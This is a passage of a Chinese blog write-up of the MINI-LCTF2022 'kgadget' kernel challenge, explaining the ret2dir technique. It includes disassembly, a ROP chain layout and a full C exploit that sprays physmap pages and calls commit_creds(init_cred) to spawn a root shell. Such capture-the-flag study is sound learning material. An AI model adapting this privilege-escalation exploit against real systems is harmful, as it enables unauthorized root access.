<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disassemble swapgs_restore_regs_and_return_to_usermode                                                                                                                                                </span><br><span class="line">Dump of assembler code for function swapgs_restore_regs_and_return_to_usermode:    </span><br><span class="line">0xffffffff81c00fb0 &lt;+0&gt;:     nop    DWORD PTR [rax+rax*1+0x0] </span><br><span class="line">0xffffffff81c00fb5 &lt;+5&gt;:     pop    r15                    </span><br><span class="line">0xffffffff81c00fb7 &lt;+7&gt;:     pop    r14 </span><br><span class="line">0xffffffff81c00fb9 &lt;+9&gt;:     pop    r13     </span><br><span class="line">0xffffffff81c00fbb &lt;+11&gt;:    pop    r12</span><br><span class="line">0xffffffff81c00fbd &lt;+13&gt;:    pop    rbp</span><br><span class="line">0xffffffff81c00fbe &lt;+14&gt;:    pop    rbx</span><br><span class="line">0xffffffff81c00fbf &lt;+15&gt;:    pop    r11</span><br><span class="line">0xffffffff81c00fc1 &lt;+17&gt;:    pop    r10</span><br><span class="line">0xffffffff81c00fc3 &lt;+19&gt;:    pop    r9</span><br><span class="line">0xffffffff81c00fc5 &lt;+21&gt;:    pop    r8</span><br><span class="line">0xffffffff81c00fc7 &lt;+23&gt;:    pop    rax</span><br><span class="line">0xffffffff81c00fc8 &lt;+24&gt;:    pop    rcx</span><br><span class="line">0xffffffff81c00fc9 &lt;+25&gt;:    pop    rdx</span><br><span class="line">0xffffffff81c00fca &lt;+26&gt;:    pop    rsi;直到这里恢复一些当时中断保存的pt_regs寄存器组</span><br><span class="line">0xffffffff81c00fcb &lt;+27&gt;:    mov    rdi,rsp;一般返回用户态起shll的rop直接返回这里即可</span><br><span class="line">0xffffffff81c00fce &lt;+30&gt;:    mov    rsp,QWORD PTR gs:0x6004</span><br><span class="line">0xffffffff81c00fd7 &lt;+39&gt;:    push   QWORD PTR [rdi+0x30]</span><br><span class="line">0xffffffff81c00fda &lt;+42&gt;:    push   QWORD PTR [rdi+0x28]</span><br><span class="line">0xffffffff81c00fdd &lt;+45&gt;:    push   QWORD PTR [rdi+0x20]</span><br><span class="line">0xffffffff81c00fe0 &lt;+48&gt;:    push   QWORD PTR [rdi+0x18]</span><br><span class="line">0xffffffff81c00fe3 &lt;+51&gt;:    push   QWORD PTR [rdi+0x10]</span><br><span class="line">0xffffffff81c00fe6 &lt;+54&gt;:    push   QWORD PTR [rdi]</span><br><span class="line">0xffffffff81c00fe8 &lt;+56&gt;:    push   rax</span><br><span class="line">0xffffffff81c00fe9 &lt;+57&gt;:    xchg   ax,ax</span><br><span class="line">0xffffffff81c00feb &lt;+59&gt;:    mov    rdi,cr3</span><br><span class="line">0xffffffff81c00fee &lt;+62&gt;:    jmp    0xffffffff81c01024 &lt;swapgs_restore_regs_and_return_to_usermode+116&gt;</span><br><span class="line">......</span><br><span class="line">0xffffffff81c01024 &lt;swapgs_restore_regs_and_return_to_usermode+116&gt;: or     rdi,0x1000;恢复用户态PGD</span><br><span class="line">0xffffffff81c0102b &lt;swapgs_restore_regs_and_return_to_usermode+123&gt;: mov    cr3,rdi</span><br><span class="line">0xffffffff81c0102e &lt;swapgs_restore_regs_and_return_to_usermode+126&gt;: pop    rax</span><br><span class="line">0xffffffff81c0102f &lt;swapgs_restore_regs_and_return_to_usermode+127&gt;: pop    rdi</span><br><span class="line">0xffffffff81c01030 &lt;swapgs_restore_regs_and_return_to_usermode+128&gt;: swapgs </span><br><span class="line">0xffffffff81c01033 &lt;swapgs_restore_regs_and_return_to_usermode+131&gt;: jmp    0xffffffff81c01060 &lt;native_iret&gt;</span><br><span class="line">......</span><br><span class="line">0xffffffff81c01060 &lt;native_iret&gt;:    test   BYTE PTR [rsp+0x20],0x4;需要不相等，一般满足</span><br><span class="line">0xffffffff81c01065 &lt;native_iret+5&gt;:  jne    0xffffffff81c01069 &lt;native_irq_return_ldt&gt;</span><br><span class="line">0xffffffff81c01067 &lt;native_irq_return_iret&gt;: iretq</span><br></pre></td></tr></table></figure>

<p>切换了用户态的页表和gs寄存器，多pop了rax和rdi，所以提权rop链变为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rsp  ----&gt;  swapgs_restore_regs_and_return_to_usermode::mov_rdi_rsp</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">            <span class="number">0</span></span><br><span class="line">            get root shell</span><br><span class="line">            cs</span><br><span class="line">            rflags</span><br><span class="line">            rsp</span><br><span class="line">            ss</span><br></pre></td></tr></table></figure>

<p>physmap里最后的形式就是下面这样</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">------------------------</span><br><span class="line">add rsp, val ; ret </span><br><span class="line">add rsp, val ; ret </span><br><span class="line">add rsp, val ; ret </span><br><span class="line">add rsp, val ; ret</span><br><span class="line">...</span><br><span class="line">add rsp, val ; ret # 该gadget必定会命中下一个区域中的一条ret，之后便能平缓地“滑”到常规的提权 rop 上</span><br><span class="line">------------------------</span><br><span class="line">ret</span><br><span class="line">ret</span><br><span class="line">...</span><br><span class="line">ret</span><br><span class="line">------------------------</span><br><span class="line">common root ROP chain</span><br><span class="line">------------------------</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> page_size;</span><br><span class="line"><span class="type">size_t</span> pop_rsp_ret = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0xc0 = <span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="type">size_t</span> ret = <span class="number">0xffffffff8108c6f1</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810c9540</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810c92e0</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff82a6b700</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs = <span class="number">0xffffffff81c0129c</span>;</span><br><span class="line"><span class="type">size_t</span> iret_poprbp = <span class="number">0xffffffff8103ba65</span>;</span><br><span class="line"><span class="type">size_t</span> guess;</span><br><span class="line"><span class="type">size_t</span> *physmap_spray_arr[<span class="number">16000</span>];</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fb0</span> + <span class="number">27</span>;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">          <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">          <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">constructROPChain</span><span class="params">(<span class="type">size_t</span> *rop)</span> &#123;</span><br><span class="line">  <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (; idx &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>); idx++)</span><br><span class="line">    rop[idx] = add_rsp_0xc0;</span><br><span class="line">  <span class="keyword">for</span> (; idx &lt; (page_size / <span class="number">8</span> - <span class="number">0x10</span>); idx++)</span><br><span class="line">    rop[idx] = ret;</span><br><span class="line">  rop[idx++] = pop_rdi_ret;</span><br><span class="line">  rop[idx++] = init_cred;</span><br><span class="line">  rop[idx++] = commit_creds;</span><br><span class="line">  rop[idx++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">  rop[idx++] = <span class="number">0</span>;</span><br><span class="line">  rop[idx++] = <span class="number">0</span>;</span><br><span class="line">  rop[idx++] = (<span class="type">size_t</span>)spawn_shell;</span><br><span class="line">  rop[idx++] = user_cs;</span><br><span class="line">  rop[idx++] = user_rflags;</span><br><span class="line">  rop[idx++] = user_sp;</span><br><span class="line">  rop[idx++] = user_ss;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  save_status();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open  error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">  physmap_spray_arr[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,</span><br><span class="line">                              MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  constructROPChain(physmap_spray_arr[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15000</span>; i++) &#123;</span><br><span class="line">    physmap_spray_arr[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,</span><br><span class="line">                                MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!physmap_spray_arr[i]) &#123;</span><br><span class="line">      perror(<span class="string">&quot;Mmap Failed!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(physmap_spray_arr[i], physmap_spray_arr[<span class="number">0</span>], page_size);</span><br><span class="line">  &#125;</span><br><span class="line">  guess = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line">  __asm__(<span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r9,    pop_rsp_ret;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r8,    guess;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rax,   0x10;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rdx,   guess;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rsi,   0x1bf52;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rdi,   fd;&quot;</span></span><br><span class="line">          <span class="string">&quot;syscall&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/22/kernel-ret2dir/image-20230828094130225.png" alt="image-20230828094130225"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/560805991">https://zhuanlan.zhihu.com/p/560805991</a></li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/137277724">https://zhuanlan.zhihu.com/p/137277724</a></li>
<li><a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir">https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir</a></li>
</ul>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#return-to-direct-mapped-memory"><span class="toc-number">1.</span> <span class="toc-text">return to direct-mapped memory</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MINI-LCTF2022-kgadget"><span class="toc-number">1.1.</span> <span class="toc-text">MINI-LCTF2022 - kgadget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.1.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.2.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/&text=Kernel Ret2dir"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/&title=Kernel Ret2dir"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/&is_video=false&description=Kernel Ret2dir"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Kernel Ret2dir&body=Check out this article: https://grxer.gitee.io/2023/08/22/kernel-ret2dir/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/&title=Kernel Ret2dir"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/&title=Kernel Ret2dir"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/&title=Kernel Ret2dir"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/&title=Kernel Ret2dir"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/&name=Kernel Ret2dir&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/08/22/kernel-ret2dir/&t=Kernel Ret2dir"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    bxz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
